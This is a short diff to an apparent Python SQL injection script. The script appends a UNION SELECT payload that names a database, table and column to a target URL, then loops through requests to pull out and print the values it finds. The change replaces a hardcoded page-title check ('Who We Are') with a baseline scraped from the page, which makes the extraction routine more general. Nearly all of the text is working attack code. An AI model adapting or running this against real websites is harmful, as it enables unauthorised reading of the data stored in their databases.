@@ -29,6 +29,7 @@ payload = f" UNION SELECT {column} FROM {database}.{table} {where} ORDER BY titl
 url = f"{baseurl}{payload}"
 print (f"Request: {url}")
 message = ""
+default = re.search(rf'{match}', requests.get(f"{baseurl}").text, re.DOTALL).group(1)
 while True:
     r = requests.get(f"{baseurl}{payload} {N}")
     N += 1
@@ -36,6 +37,6 @@ while True:
     if success is None:
         continue
     message = success.group(1)
-    if message == "Who We Are":
+    if message == default:
         break
     print(message)
